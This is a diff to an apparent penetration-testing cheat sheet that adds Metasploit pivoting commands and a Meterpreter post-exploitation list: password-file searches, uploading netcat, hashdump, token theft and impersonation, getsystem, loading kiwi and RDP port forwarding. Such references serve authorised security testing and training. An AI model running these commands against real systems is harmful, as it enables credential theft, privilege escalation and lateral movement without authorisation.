@@ -468,7 +468,38 @@ msf6 exploit(windows/smb/ms17_010_psexec) > exploit -e shikata_ga_nai
 msf6 > sessions
 msf6 > sessions -i 1
 msf6 > jobs
-msf6 > jobs kill 1 
+msf6 > jobs kill 1
+msf6 > route print
+msf6 > route add 192.168.1.0/24 11
+msf6 > use multi/manage/autoroute
+```
+
+- Meterpreter
+
+```
+meterpreter > sysinfo
+meterpreter > getuid
+meterpreter > search -f *pass*.txt
+meterpreter > upload /usr/share/windows-binaries/nc.exe c:\\Users\\Public
+meterpreter > download c:\\Windows\\system32\\calc.exe /tmp/calc.exe
+meterpreter > shell
+meterpreter > getprivs
+meterpreter > use priv
+meterpreter > hashdump
+meterpreter > use incognito
+meterpreter > list_tokens -u
+meterpreter > list_tokens -g
+meterpreter > impersonate_token <Domain>\<Username>
+meterpreter > steal_token <PID>
+meterpreter > drop_token
+meterpreter > execute -f <cmd.exe> -i
+meterpreter > execute -f <cmd.exe> -i -H -t
+meterpreter > rev2self
+meterpreter > getsystem
+meterpreter > ps
+meterpreter > migrate <PID>
+meterpreter > load kiwi
+meterpreter > portfwd add -l 3389 -p 3389 -r 192.168.1.110
 ```
 
 - Local File Inclusion (LFI)
